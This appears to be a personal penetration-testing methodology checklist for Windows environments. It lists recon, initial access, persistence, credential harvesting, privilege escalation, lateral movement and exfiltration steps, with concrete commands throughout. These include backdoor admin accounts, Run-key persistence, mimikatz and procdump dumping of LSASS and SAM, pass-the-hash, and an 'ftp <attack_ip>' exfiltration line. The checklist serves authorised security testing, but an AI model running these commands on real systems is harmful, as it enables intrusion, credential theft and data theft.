# Index
- [[Methodology]]
	- [[Physical Access Methodology]]
	- [[Linux Methodology]]
	- [[Windows Methodology]]
	- [[Web Application Methodology]]
	- [[Cloud Methodology]]

# External Reconnaissance
- [ ] **OSINT:** Gather emails, domains, IP addresses, and open ports related to the target.
- [ ] **Nmap:** Conduct a comprehensive scan to identify open ports and services.
    - `nmap -n -Pn -A <target_ip> -p- -o <assessment_number>_<system_name>_<date>`
- [ ] **Nessus:** Identify vulnerabilities, misconfigurations, and outdated patches using Nessus.
- [ ] **Shodan/Censys:** Search for exposed services and vulnerabilities related to the web application.
    - `shodan search <target_ip>`

# Initial Access
- [ ] **Insecure Ports:** Analyze open ports and manually enumerate services (e.g., `netcat`, `telnet`, `curl`).
- [ ] **Exploit Public-Facing Services:** Use exploitation tools (e.g., `Metasploit`, `searchsploit`, CVE exploits) against services like SSH, Apache, etc.
- [ ] **Default Credentials/Null Logon:** Exploit default credentials or null logons on public services.
- [ ] **Password Spraying/Brute Force:** Use tools such as `Hydra` or `CrackMapExec` for brute-forcing services like SSH, FTP, or web applications.
- [ ] **Social Engineering/Phishing:** Launch spear-phishing attacks delivering payloads (e.g., ELF binaries or embedded Office document payloads).

# Internal Reconnaissance

## Host Based
- [ ] **System Information:** Gather system details such as OS version, architecture, and installed patches.
    - `systeminfo`
    - `Get-ComputerInfo`
- [ ] **User Information and Permissions:** Enumerate user accounts and privilege levels.
    - `net user`
    - `Get-LocalUser`
- [ ] **Group Information and Permissions:** Check for administrative group memberships.
    - `net localgroup administrators`
    - `Get-LocalGroupMember -Group "Administrators"`
- [ ] **Process and Service Enumeration:** List running processes and services to identify high-value targets.
    - `tasklist`
    - `Get-Service`
- [ ] **File System Enumeration:** Search for sensitive files, directories, and configuration files.
    - `dir /s`
    - `Get-ChildItem -Recurse`
- [ ] **Installed Software and Patch Levels:** Identify installed programs and software versions.
    - `wmic product get name,version`
- [ ] **Check Logs:** Review Windows event logs for valuable information (e.g., failed logins, process creation, etc.).
    - `wevtutil el`
    - `Get-WinEvent -LogName <logname>`

## Network Based
- [ ] **Network Interfaces and Configuration:** Review network interfaces and configuration details.
    - `ipconfig /all`
    - `Get-NetIPConfiguration`
- [ ] **Routing Tables and Gateway Information:** List routing details to understand the network layout.
    - `route print`
    - `Get-NetRoute`
- [ ] **DNS Enumeration:** Check DNS configurations and internal domain structure.
    - `ipconfig /displaydns`
    - `Resolve-DnsName <domain>`
- [ ] **Active Network Connections:** Analyze active connections to identify internal communication.
    - `netstat -ano`
    - `Get-NetTCPConnection`
- [ ] **Firewall and Security Settings:** Review firewall rules and security configurations.
    - `netsh advfirewall show allprofiles`
    - `Get-NetFirewallRule`
- [ ] **Neighboring Hosts and Network Discovery:** Discover other hosts on the internal network.
    - `arp -a`
    - `net view`
    - `Get-NetNeighbor`
- [ ] **Network Shares:** Enumerate shared folders and drives on the network.
    - `net share`
    - `Get-SmbShare`
- [ ] **Network Services:** Identify services running on the network (e.g., SMB, RDP, FTP).
    - `netstat -an`
    - `Get-Service`
- [ ] **Packet Sniffing:** Capture network traffic to analyze sensitive data (e.g., `Wireshark`, `tcpdump`).
    - `tcpdump` or `Wireshark`

# Persistence
- [ ] **Create New User:** Add a backdoor user for persistence.
    - `net user <username> <password> /add`
    - `net localgroup administrators <username> /add`
- [ ] **Modify Existing User:** Change password or permissions of existing users.
    - `net user <username> <new_password>`
- [ ] **Scheduled Tasks:** Create or modify scheduled tasks to run persistence scripts.
    - `schtasks /create /tn <taskname> /tr <command> /sc onlogon`
    - `New-ScheduledTask`
- [ ] **Startup Folder/Registry Modification:** Add programs or scripts to startup folders or registry keys.
    - Add to `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
    - `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <name> /t REG_SZ /d <path>`
- [ ] **Service Modification:** Modify or create services for persistence.
    - `sc create <servicename> binPath= <path_to_executable>`
- [ ] **WMI Event Subscription:** Use WMI events to trigger malicious scripts or commands.
    - `Register-WmiEvent`
- [ ] **DLL Hijacking:** Replace legitimate DLLs in common directories with malicious versions.
- [ ] **BITS Jobs:** Use BITS (Background Intelligent Transfer Service) jobs for persistence.
    - `bitsadmin /create /download <jobname>`
- [ ] **Remote Desktop/Backdoor Access:** Enable RDP and use backdoor access.
    - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0`
- [ ] **PowerShell Profiles:** Modify PowerShell profiles for persistence.
    - `echo <command> >> $profile`

# Credential Harvesting
- [ ] **SAM/LSASS Dumping:** Extract password hashes from SAM or memory using tools like `mimikatz` or `procdump`.
    - `mimikatz "privilege::debug" "lsadump::sam"`
    - `procdump -ma lsass.exe lsass.dmp`
- [ ] **Registry Dump:** Dump Windows registry for stored credentials.
    - `reg save HKLM\SYSTEM <path_to_save>`
    - `reg save HKLM\SAM <path_to_save>`
- [ ] **Credential Files:** Search for credentials in configuration files or saved files.
    - `findstr /si password *.txt`
- [ ] **Password Spraying/Brute Force:** Crack password hashes using tools like `Hashcat` or `John the Ripper`.
    - `hashcat -m 1000 hashes.txt wordlist.txt`
- [ ] **Kerberos Ticket Extraction (Pass-the-Ticket):** Extract and reuse Kerberos tickets.
    - `mimikatz "kerberos::list"`
- [ ] **Dump Credentials from Memory:** Use `mimikatz` to dump plaintext credentials from memory.
    - `mimikatz "sekurlsa::logonpasswords"`
- [ ] **Network Traffic Analysis:** Capture network traffic to intercept credentials.
    - `tcpdump -i <interface> -w capture.pcap`

# Privilege Escalation
- [ ] **Unquoted Service Paths:** Check for misconfigured services with unquoted paths.
    - `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v """
- [ ] **Weak File Permissions:** Look for files or services with weak permissions.
    - `icacls <file_or_directory>`
- [ ] **DLL Hijacking:** Identify vulnerable DLLs for hijacking.
    - `Process Monitor` or `Autoruns`
- [ ] **Insecure Service Configurations:** Check for services running with SYSTEM privileges that can be exploited.
    - `sc qc <service_name>`
- [ ] **Sudo Equivalent (Admin Rights Misconfiguration):** Check for user accounts in the Administrators group.
    - `net localgroup administrators`
- [ ] **Token Impersonation:** Use `mimikatz` to perform token impersonation and escalate privileges.
    - `mimikatz "privilege::debug" "token::elevate"`
- [ ] **Kernel Exploits:** Leverage kernel-level vulnerabilities to escalate privileges.
    - e.g., `CVE-2021-1675 (PrintNightmare)`

# Lateral Movement/Pivoting/Tunneling
- [ ] **PSEXEC:** Execute commands on remote hosts using `psexec`.
    - `psexec \\<target_ip> -u <user> -p <password> cmd`
- [ ] **WMI:** Use WMI to execute commands on remote systems.
    - `wmic /node:<target_ip> process call create <command>`
- [ ] **RDP:** Leverage RDP for lateral movement.
    - `mstsc /v:<target_ip>`
- [ ] **Remote PowerShell:** Use PowerShell Remoting for lateral movement.
    - `Enter-PSSession -ComputerName <target_ip> -Credential <user>`
- [ ] **SMB Shares:** Move laterally by accessing SMB shares.
    - `net use \\<target_ip>\C$ /user:<domain>\<user> <password>`
- [ ] **Pass-the-Hash:** Use tools like `mimikatz` to pass the hash for lateral movement.
    - `mimikatz "sekurlsa::pth"`
- [ ] **WinRM:** Use WinRM to remotely execute commands.
    - `evil-winrm -i <target_ip> -u <username> -p <password>`
- [ ] **ProxyChains:** Use `ProxyChains` to pivot traffic through compromised systems.
- [ ] **Port Forwarding:** Use `plink` for port forwarding to establish a pivot.
    - `plink -L <local_port>:<target_ip>:<remote_port> <user>@<jump_host>`

# Data Exfiltration
- [ ] **Data Obfuscation:** Compress and encrypt files before exfiltration.
    - `Compress-Archive`
    - `openssl aes-256-cbc`
- [ ] **Standard Protocols:** Use FTP, SMB, HTTP, or HTTPS for data exfiltration.
    - `ftp <attack_ip>`
    - `Invoke-WebRequest`
- [ ] **Email:** Send sensitive data over email.
    - `Send-MailMessage`
- [ ] **Cloud Services:** Use cloud platforms like OneDrive, AWS, or Google Drive to exfiltrate data.
    - `rclone copy <file> onedrive:remote_path`
- [ ] **Steganography:** Hide data inside images or files to exfiltrate.
    - `Invoke-ImageLoad`
- [ ] **Physical Media:** Exfiltrate data using removable drives.
- [ ]  **Wireless Networks:** Use a wireless network for data exfiltration if network segmentation allows.
